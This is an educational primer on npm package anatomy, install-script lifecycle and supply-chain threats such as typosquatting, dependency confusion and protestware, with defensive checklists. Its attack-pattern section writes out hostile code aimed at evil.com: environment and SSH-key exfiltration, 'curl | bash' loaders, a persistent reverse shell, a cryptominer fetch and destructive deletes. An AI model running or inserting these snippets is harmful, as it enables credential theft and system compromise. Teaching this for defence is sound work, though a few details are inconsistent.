# Primer 1: Understanding npm Package Structure and Installation

Welcome to the first primer of our tutorial series. This primer provides a foundational understanding of npm package structure, installation mechanics, and security implications. Think of this as the "how things work" guide that underpins all the security analysis we've built.

---

## What is an npm Package?

### The Anatomy of a Package

An npm package is more than just code—it's a structured collection of files with metadata that tells npm how to install, use, and manage it.

```
┌─────────────────────────────────────────────────────────────┐
│                    NPM PACKAGE STRUCTURE                    │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  my-package/                                               │
│  ├── package.json          # 📋 Manifest file              │
│  ├── README.md             # 📖 Documentation              │
│  ├── LICENSE               # 📜 License file               │
│  ├── index.js              # 🚀 Main entry point           │
│  ├── src/                  # 📁 Source code                │
│  │   ├── index.js                                          │
│  │   ├── utils.js                                          │
│  │   └── helpers.js                                        │
│  ├── lib/                  # 📁 Compiled output            │
│  │   └── index.js                                          │
│  ├── test/                 # 🧪 Tests                     │
│  │   └── index.test.js                                     │
│  ├── node_modules/         # 📦 Dependencies (when installed)│
│  ├── .npmignore            # 🚫 Files to exclude          │
│  └── .gitignore            # 🚫 Git ignore                │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### The package.json File

The `package.json` file is the heart of every npm package. It contains metadata, scripts, dependencies, and configuration.

```javascript
// Complete package.json example
{
  // === REQUIRED FIELDS ===
  "name": "my-package",           // Package name (must be unique)
  "version": "1.0.0",             // Semantic versioning
  "description": "A sample package",
  
  // === ENTRY POINTS ===
  "main": "index.js",             // CommonJS entry point
  "module": "dist/index.mjs",     // ES Module entry point
  "types": "dist/index.d.ts",     // TypeScript types
  "exports": {                    // Modern export mapping
    ".": {
      "import": "./dist/index.mjs",
      "require": "./dist/index.js"
    }
  },
  
  // === SCRIPTS ===
  "scripts": {
    "preinstall": "node scripts/preinstall.js",
    "install": "node-gyp rebuild",
    "postinstall": "node scripts/postinstall.js",
    "test": "jest",
    "build": "webpack --config webpack.config.js",
    "prepublishOnly": "npm run build",
    "preversion": "npm test",
    "version": "npm run build && git add -A dist",
    "postversion": "git push && git push --tags"
  },
  
  // === DEPENDENCIES ===
  "dependencies": {               // Production dependencies
    "express": "^4.18.0",
    "lodash": "^4.17.21"
  },
  "devDependencies": {            // Development dependencies
    "jest": "^29.7.0",
    "webpack": "^5.89.0"
  },
  "peerDependencies": {           // Required peer dependencies
    "react": "^18.0.0"
  },
  "optionalDependencies": {       // Optional dependencies
    "fsevents": "^2.3.2"
  },
  
  // === METADATA ===
  "author": "John Doe <john@example.com>",
  "license": "MIT",
  "repository": {
    "type": "git",
    "url": "https://github.com/user/my-package"
  },
  "homepage": "https://my-package.dev",
  "bugs": {
    "url": "https://github.com/user/my-package/issues"
  },
  "keywords": ["sample", "example", "template"],
  
  // === CONFIGURATION ===
  "engines": {                    // Required Node.js version
    "node": ">=18.0.0"
  },
  "os": ["darwin", "linux"],      // Supported OS
  "cpu": ["x64", "arm64"],        // Supported CPU architectures
  "private": false,               // Private package flag
  
  // === PUBLISH CONFIG ===
  "publishConfig": {
    "registry": "https://registry.npmjs.org/",
    "access": "public"
  },
  
  // === FILES TO INCLUDE ===
  "files": [                      // Files included when publishing
    "dist/",
    "lib/",
    "index.js"
  ]
}
```

---

## The npm Install Lifecycle

### Phase-by-Phase Breakdown

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    NPM INSTALL LIFECYCLE                                   │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  Phase 1: PREINSTALL                                                       │
│  ┌──────────────────────────────────────────────────────────────────────┐  │
│  │  • npm reads package.json                                            │  │
│  │  • Checks for existing installation                                  │  │
│  │  • Runs preinstall script (if defined)                              │  │
│  │  • ⚠️ SECURITY RISK: Executes arbitrary code BEFORE installation    │  │
│  └──────────────────────────────────────────────────────────────────────┘  │
│                                    │                                       │
│                                    ▼                                       │
│  Phase 2: FETCH                                                           │
│  ┌──────────────────────────────────────────────────────────────────────┐  │
│  │  • Resolves dependency tree                                          │  │
│  │  • Checks package registry                                           │  │
│  │  • Downloads tarball                                                 │  │
│  │  • Verifies integrity (sha512 checksum)                             │  │
│  │  • ⚠️ SECURITY RISK: Man-in-the-middle attacks during download      │  │
│  └──────────────────────────────────────────────────────────────────────┘  │
│                                    │                                       │
│                                    ▼                                       │
│  Phase 3: INSTALL                                                         │
│  ┌──────────────────────────────────────────────────────────────────────┐  │
│  │  • Extracts tarball to node_modules                                  │  │
│  │  • Runs install script (if defined)                                 │  │
│  │  • Links dependencies                                                │  │
│  │  • ⚠️ SECURITY RISK: Scripts run with user permissions              │  │
│  └──────────────────────────────────────────────────────────────────────┘  │
│                                    │                                       │
│                                    ▼                                       │
│  Phase 4: POSTINSTALL                                                     │
│  ┌──────────────────────────────────────────────────────────────────────┐  │
│  │  • Runs postinstall script (if defined)                             │  │
│  │  • Updates package-lock.json                                        │  │
│  │  • Updates dependency tree                                          │  │
│  │  • ⚠️ SECURITY RISK: Post-install execution is common attack vector │  │
│  └──────────────────────────────────────────────────────────────────────┘  │
│                                    │                                       │
│                                    ▼                                       │
│  Phase 5: DEPENDENCIES INSTALLED                                         │
│  ┌──────────────────────────────────────────────────────────────────────┐  │
│  │  • Package ready for use                                             │  │
│  │  • All scripts completed                                             │  │
│  │  • ⚠️ SECURITY RISK: All scripts already executed                   │  │
│  └──────────────────────────────────────────────────────────────────────┘  │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Detailed Script Phases

```javascript
/**
 * COMPLETE NPM SCRIPT LIFECYCLE
 * Showing all available scripts and their execution order
 */

const lifecycleScripts = {
    // 1. PRE-INSTALLATION
    preinstall: {
        runs: 'Before package is installed',
        risk: 'HIGH',
        example: 'node scripts/check-compatibility.js',
        description: 'Check system compatibility before installation'
    },
    
    // 2. INSTALLATION
    install: {
        runs: 'During package installation',
        risk: 'CRITICAL',
        example: 'node-gyp rebuild',
        description: 'Build native modules after installation'
    },
    
    // 3. POST-INSTALLATION
    postinstall: {
        runs: 'After package is installed',
        risk: 'CRITICAL',
        example: 'node scripts/setup.js',
        description: 'Most common attack vector - runs after install'
    },
    
    // 4. PRE-UNINSTALL
    preuninstall: {
        runs: 'Before package is uninstalled',
        risk: 'MEDIUM',
        example: 'node scripts/cleanup.js',
        description: 'Cleanup before removal'
    },
    
    // 5. UNINSTALL
    uninstall: {
        runs: 'During package uninstallation',
        risk: 'LOW',
        example: 'echo "Removing package"',
        description: 'Uninstall hooks'
    },
    
    // 6. POST-UNINSTALL
    postuninstall: {
        runs: 'After package is uninstalled',
        risk: 'LOW',
        example: 'echo "Package removed"',
        description: 'Cleanup after removal'
    },
    
    // 7. VERSION SCRIPTS
    preversion: {
        runs: 'Before version bump',
        risk: 'MEDIUM',
        example: 'npm test',
        description: 'Run tests before version bump'
    },
    version: {
        runs: 'During version bump',
        risk: 'MEDIUM',
        example: 'npm run build && git add -A dist',
        description: 'Build and commit during version bump'
    },
    postversion: {
        runs: 'After version bump',
        risk: 'LOW',
        example: 'git push && git push --tags',
        description: 'Push after version bump'
    },
    
    // 8. PUBLISH SCRIPTS
    prepublish: {
        runs: 'Before publishing',
        risk: 'HIGH',
        example: 'npm run build',
        description: 'Build before publish'
    },
    publish: {
        runs: 'During publishing',
        risk: 'HIGH',
        example: 'npm publish',
        description: 'Publish to registry'
    },
    postpublish: {
        runs: 'After publishing',
        risk: 'LOW',
        example: 'node scripts/post-publish.js',
        description: 'Post-publish cleanup'
    },
    
    // 9. TEST SCRIPTS
    pretest: {
        runs: 'Before tests',
        risk: 'LOW',
        example: 'npm run lint',
        description: 'Lint before tests'
    },
    test: {
        runs: 'During tests',
        risk: 'LOW',
        example: 'jest',
        description: 'Run tests'
    },
    posttest: {
        runs: 'After tests',
        risk: 'LOW',
        example: 'echo "Tests complete"',
        description: 'Post-test cleanup'
    },
    
    // 10. PREPARE (Modern)
    prepare: {
        runs: 'During install AND publish',
        risk: 'HIGH',
        example: 'npm run build',
        description: 'Runs on install and publish'
    }
};
```

---

## The Node.js Runtime Environment

### Understanding the Execution Context

When npm runs scripts, they execute in the Node.js runtime with full access to the system.

```javascript
/**
 * NODE.JS RUNTIME ENVIRONMENT
 * What packages can access during installation
 */

const runtimeCapabilities = {
    // 1. File System Access
    filesystem: {
        canRead: true,
        canWrite: true,
        canDelete: true,
        canModify: true,
        scope: 'Everything the user has access to',
        example: `
            const fs = require('fs');
            // Read any file the user can access
            const data = fs.readFileSync('/etc/passwd', 'utf8');
            // Write anywhere the user can write
            fs.writeFileSync('/tmp/malicious.sh', 'rm -rf /');
        `
    },
    
    // 2. Network Access
    network: {
        canConnect: true,
        canListen: false,
        canSend: true,
        canReceive: true,
        scope: 'Any network resource',
        example: `
            const http = require('http');
            // Make outbound connections
            http.get('http://evil.com/exfil?data=' + JSON.stringify(process.env));
            // Can't listen (would require server)
        `
    },
    
    // 3. Environment Variables
    environment: {
        canRead: true,
        canWrite: true,
        canModify: true,
        scope: 'All process environment variables',
        example: `
            // Read all environment variables
            const secrets = { ...process.env };
            // This includes API keys, tokens, passwords
            console.log(process.env.NODE_ENV);
            console.log(process.env.DATABASE_URL);
        `
    },
    
    // 4. Child Processes
    childProcess: {
        canExecute: true,
        canSpawn: true,
        canFork: true,
        scope: 'Any system command',
        example: `
            const { exec } = require('child_process');
            // Execute any system command
            exec('curl http://evil.com/install.sh | bash');
            exec('rm -rf ~/.ssh');
            exec('cat /etc/passwd');
        `
    },
    
    // 5. Native Modules
    nativeModules: {
        canLoad: true,
        canExecute: true,
        scope: 'Any .node file with native code',
        example: `
            // Load native code that can do anything
            const native = require('./build/Release/addon.node');
            // Native code can bypass Node.js sandbox
        `
    },
    
    // 6. Dynamic Code
    dynamicCode: {
        canEval: true,
        canCompile: true,
        canRun: true,
        scope: 'Any JavaScript code',
        example: `
            // Execute arbitrary code
            eval('console.log("Hello from eval")');
            new Function('console.log("Hello from Function")')();
            require('vm').runInNewContext('console.log("Hello from VM")');
        `
    }
};
```

---

## Common Attack Vectors

### 1. Typosquatting

Attackers publish packages with names similar to popular packages.

```javascript
/**
 * TYPOSQUATTING EXAMPLES
 * Common typosquatting patterns
 */

const typosquattingPatterns = {
    // Popular package: express
    typosquatting: [
        'exprees',          // One-letter swap
        'expres',           // Missing letter
        'expresss',         // Extra letter
        'express-',         // Added hyphen
        'express-latest',   // Added suffix
        'express-node',     // Added prefix/suffix
        'express-core',     // Added core
        'express-lib',      // Added lib
        'expreess',         // Double letter
        'expresjs'          // Added js
    ]
};

// Example of a malicious typosquatting package
const maliciousTyposquat = {
    name: 'exprees',  // Looks like 'express'
    version: '1.0.0',
    scripts: {
        postinstall: `
            // This runs when the package is installed
            const fs = require('fs');
            const http = require('http');
            
            // Steal environment variables
            const data = JSON.stringify(process.env);
            
            // Send to attacker's server
            http.get('http://evil.com/collect?data=' + encodeURIComponent(data));
            
            // Install the real package (to hide the attack)
            require('child_process').execSync('npm install express@latest', { stdio: 'ignore' });
        `
    }
};
```

### 2. Dependency Confusion

Attackers publish internal packages to the public registry.

```javascript
/**
 * DEPENDENCY CONFUSION EXAMPLE
 * Internal package name published publicly
 */

// Internal package.json (private)
const internalPackage = {
    name: '@my-company/auth-service',  // Scoped package
    version: '1.0.0',
    dependencies: {
        'my-company-utils': '^1.0.0'  // Unscoped internal dependency
    }
};

// Attacker publishes to public npm
const attackerPackage = {
    name: 'my-company-utils',  // Same name as internal
    version: '999.0.0',        // Higher version
    scripts: {
        postinstall: `
            // Run when the package is installed
            // This will be installed because it has a higher version
            require('child_process').exec('curl http://evil.com/backdoor.sh | bash');
        `
    }
};

// npm will install the public version because it has a higher version
// npm install my-company-utils  // Downloads attacker's version
```

### 3. Malicious Install Scripts

```javascript
/**
 * MALICIOUS INSTALL SCRIPT PATTERNS
 * Common malicious activities in install scripts
 */

const maliciousScripts = {
    // Pattern 1: Environment Variable Exfiltration
    envExfiltration: `
        const fs = require('fs');
        const https = require('https');
        
        // Collect environment variables
        const env = Object.entries(process.env)
            .filter(([key]) => key.includes('KEY') || key.includes('TOKEN') || key.includes('SECRET'))
            .reduce((acc, [key, value]) => ({ ...acc, [key]: value }), {});
        
        // Send to attacker
        https.get('https://evil.com/collect?data=' + encodeURIComponent(JSON.stringify(env)));
    `,
    
    // Pattern 2: Backdoor Installation
    backdoorInstall: `
        const fs = require('fs');
        const path = require('path');
        const os = require('os');
        
        // Create a persistent backdoor
        const backdoor = \`
            const net = require('net');
            const cp = require('child_process');
            const sh = cp.spawn('/bin/sh', []);
            const client = new net.Socket();
            client.connect(4444, 'evil.com', () => {
                client.pipe(sh.stdin);
                sh.stdout.pipe(client);
                sh.stderr.pipe(client);
            });
        \`;
        
        // Write to startup directory
        const startupDir = {
            win32: path.join(os.homedir(), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'),
            darwin: path.join(os.homedir(), 'Library', 'LaunchAgents'),
            linux: path.join(os.homedir(), '.config', 'autostart')
        }[process.platform];
        
        if (startupDir) {
            fs.writeFileSync(path.join(startupDir, 'system-update.js'), backdoor);
        }
    `,
    
    // Pattern 3: Cryptocurrency Mining
    cryptoMining: `
        const https = require('https');
        const { exec } = require('child_process');
        
        // Download and run cryptocurrency miner
        const minerUrl = 'https://evil.com/xmrig-linux';
        exec('curl -s ' + minerUrl + ' > /tmp/xmrig && chmod +x /tmp/xmrig && /tmp/xmrig -o pool.evil.com:4444 -u wallet -t 4', {
            detached: true,
            stdio: 'ignore'
        }).unref();
    `,
    
    // Pattern 4: Data Exfiltration
    dataExfiltration: `
        const fs = require('fs');
        const path = require('path');
        const https = require('https');
        
        // Find and exfiltrate sensitive files
        const sensitiveFiles = [
            '.env',
            '.aws/credentials',
            '.ssh/id_rsa',
            'package.json',
            'config.json'
        ];
        
        for (const file of sensitiveFiles) {
            const filePath = path.join(process.cwd(), file);
            if (fs.existsSync(filePath)) {
                const data = fs.readFileSync(filePath, 'utf8');
                https.get('https://evil.com/exfil?file=' + encodeURIComponent(file) + '&data=' + encodeURIComponent(data));
            }
        }
    `,
    
    // Pattern 5: System Reconnaissance
    systemRecon: `
        const os = require('os');
        const fs = require('fs');
        const https = require('https');
        
        const info = {
            hostname: os.hostname(),
            platform: os.platform(),
            arch: os.arch(),
            cpus: os.cpus(),
            memory: os.totalmem(),
            network: os.networkInterfaces(),
            users: os.userInfo(),
            env: Object.keys(process.env),
            dirs: fs.readdirSync('/')
        };
        
        https.get('https://evil.com/recon?data=' + encodeURIComponent(JSON.stringify(info)));
    `
};
```

### 4. Protestware

Packages that include political or social messages that may impact functionality.

```javascript
/**
 * PROTESTWARE EXAMPLES
 * Packages that include political statements
 */

const protestwareExamples = {
    // Example 1: Node-IPC protestware
    nodeIPC: {
        package: 'node-ipc',
        version: '9.2.2',
        description: 'Protestware that added political messages',
        impact: 'Added code that wrote political messages to user files',
        script: `
            // Added in node-ipc@9.2.2
            const fs = require('fs');
            const path = require('path');
            
            // Write political message to desktop
            const desktop = path.join(require('os').homedir(), 'Desktop');
            fs.writeFileSync(path.join(desktop, 'WITH-LOVE-FROM-AMERICA.txt'), 
                'Political message here');
        `
    },
    
    // Example 2: Colors.js protestware
    colorsJS: {
        package: 'colors.js',
        version: '1.4.44-liberty-2',
        description: 'Protestware that broke applications',
        impact: 'Added a newline that broke many applications',
        script: `
            // Added infinite loop that broke applications
            const s = require('fs');
            const t = s.readFileSync(require('path').join(__dirname, 'package.json'), 'utf8');
            // This broke many applications that depended on colors.js
        `
    },
    
    // Example 3: Faker.js protestware
    fakerJS: {
        package: 'faker.js',
        version: '6.0.0',
        description: 'Protestware that corrupted the library',
        impact: 'Published malicious version that corrupted the codebase',
        script: `
            // Published version that changed the license and broke functionality
            // The author intentionally broke the package as protest
        `
    }
};
```

---

## Security Best Practices

### 1. Before Installing a Package

```javascript
/**
 * PRE-INSTALLATION CHECKLIST
 * What to check before installing a package
 */

const preInstallChecklist = {
    // 1. Check package popularity
    popularity: `
        # Check download statistics
        npm view <package-name> downloads
        npm view <package-name> dependents
        
        # Check GitHub stars
        # Check npm version
        npm view <package-name> version
    `,
    
    // 2. Check maintainer reputation
    maintainer: `
        # Check maintainer information
        npm view <package-name> maintainers
        npm view <package-name> contributors
        
        # Check for suspicious maintainer history
        # Check for known malicious maintainers
    `,
    
    // 3. Audit package.json
    audit: `
        # Check for suspicious scripts
        npm view <package-name> scripts
        npm view <package-name> dependencies
        npm view <package-name> devDependencies
        
        # Use our security scanner
        node phase-1/08-complete-scanner.js --path <package-path>
    `,
    
    // 4. Check for typosquatting
    typosquatting: `
        # Compare package name to popular packages
        # Use our typosquatting detector
        node phase-2/test-analyzer.js
    `,
    
    // 5. Test in isolation
    isolation: `
        # Use Docker or virtual machine
        docker run -it --rm node:18 bash
        npm install <package-name>
        # Test the package
        node -e "require('<package-name>')"
    `
};
```

### 2. During Installation

```javascript
/**
 * INSTALLATION SAFEGUARDS
 * How to safely install packages
 */

const installationSafeguards = {
    // 1. Use --dry-run
    dryRun: `
        # See what will be installed without actually installing
        npm install --dry-run <package-name>
    `,
    
    // 2. Ignore scripts
    ignoreScripts: `
        # Install without running scripts
        npm install --ignore-scripts <package-name>
        
        # Or globally
        npm install --ignore-scripts <package-name> --global
    `,
    
    // 3. Use --no-audit
    noAudit: `
        # Skip audit (faster, but less secure)
        npm install --no-audit <package-name>
    `,
    
    // 4. Use --package-lock-only
    packageLockOnly: `
        # Update lock file without installing
        npm install --package-lock-only <package-name>
    `,
    
    // 5. Use --no-fund
    noFund: `
        # Skip funding messages
        npm install --no-fund <package-name>
    `,
    
    // 6. Use offline mode
    offline: `
        # Install from cache only
        npm install --offline <package-name>
    `
};

// Safe install script
async function safeInstall(packageName) {
    console.log(`🔍 Installing ${packageName} safely...`);
    
    // 1. Dry run
    console.log('📋 Dry run...');
    const dryRun = await execCommand(`npm install --dry-run ${packageName}`);
    
    // 2. Check for suspicious scripts
    if (dryRun.includes('install') || dryRun.includes('postinstall')) {
        console.log('⚠️  Suspicious scripts detected!');
        console.log('Would you like to continue? (y/n)');
        // Wait for user confirmation
    }
    
    // 3. Install without scripts
    console.log('📦 Installing without scripts...');
    await execCommand(`npm install --ignore-scripts ${packageName}`);
    
    // 4. Run our security scanner
    console.log('🔍 Running security scan...');
    const scanner = new PackageScanner();
    const results = await scanner.scanPackages([{ name: packageName }]);
    
    // 5. If safe, run scripts
    if (results.results[0].riskLevel === 'LOW') {
        console.log('✅ Package appears safe, running scripts...');
        await execCommand(`npm rebuild ${packageName}`);
        await execCommand(`npm run postinstall --workspace ${packageName}`);
    } else {
        console.log('⚠️  Package has security risks! Manual review required.');
    }
}
```

### 3. Post-Installation Verification

```javascript
/**
 * POST-INSTALLATION VERIFICATION
 * What to check after installation
 */

const postInstallVerification = {
    // 1. Check what was installed
    checkInstallation: `
        # List installed packages
        npm list --depth=0
        
        # Check package version
        npm view <package-name> version
        npm list <package-name>
    `,
    
    // 2. Audit for vulnerabilities
    audit: `
        # Run npm audit
        npm audit
        
        # Run npm audit --production (only production dependencies)
        npm audit --production
        
        # Fix vulnerabilities
        npm audit fix
        npm audit fix --force
    `,
    
    // 3. Check for unexpected files
    checkFiles: `
        # Check for unexpected files in node_modules
        find node_modules/<package-name> -type f -name "*.exe" -o -name "*.sh" -o -name "*.bat"
        
        # Check for suspicious files
        find node_modules/<package-name> -type f -exec file {} \\; | grep -i script
    `,
    
    // 4. Monitor network connections
    monitorNetwork: `
        # Monitor network connections (Linux)
        sudo netstat -tupn | grep node
        
        # Monitor network connections (macOS)
        sudo lsof -i -n -P | grep node
    `,
    
    // 5. Check system changes
    checkSystem: `
        # Check for file system changes
        find /tmp -type f -name "*<package-name>*"
        find ~ -type f -name "*<package-name>*"
        
        # Check for startup entries
        ls -la ~/.config/autostart/
        ls -la ~/Library/LaunchAgents/
        ls -la ~/AppData/Roaming/Microsoft/Windows/Start\ Menu/Programs/Startup/
    `
};
```

---

## Summary

| Concept | Key Points |
|---------|------------|
| **Package Structure** | package.json contains scripts, dependencies, and metadata |
| **Install Lifecycle** | Multiple phases where scripts can execute |
| **Runtime Environment** | Node.js has full system access during install |
| **Attack Vectors** | Typosquatting, dependency confusion, malicious scripts, protestware |
| **Best Practices** | Dry run, ignore scripts, audit, verify after installation |
